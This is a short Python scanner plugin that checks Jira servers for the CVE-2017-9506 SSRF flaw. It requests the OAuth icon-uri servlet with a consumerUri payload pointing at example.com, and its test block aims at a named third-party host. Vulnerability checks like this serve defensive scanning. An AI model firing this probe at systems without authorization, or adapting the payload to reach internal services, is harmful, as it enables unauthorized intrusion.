#!/usr/bin/env python
# -*- coding: utf-8 -*-
# __CveNum__ = CVE-2017-9506
# __Author__ = moonfish
# _PlugName_ = jira_/plugins/servlet/oauth/users/icon-uri_SSRF漏洞
# __Refer___ = http://dontpanic.42.nl/2017/12/there-is-proxy-in-your-atlassian.html
import re

def assign(service, arg):
    if service == fingerprint.jira:
        return True, arg

def audit(arg):
    payload = 'plugins/servlet/oauth/users/icon-uri?consumerUri=http://example.com'
    target = arg + payload
    code, head, res, final_url, log= hackhttp.http(target)
    if code == 200 and "Example Domain" in res:  # 向example.com发送请求
        security_warning(target,log=log)

if __name__ == '__main__':
    from dummy import *
    audit(assign(fingerprint.jira, "http://doc.primeton.com/")[1])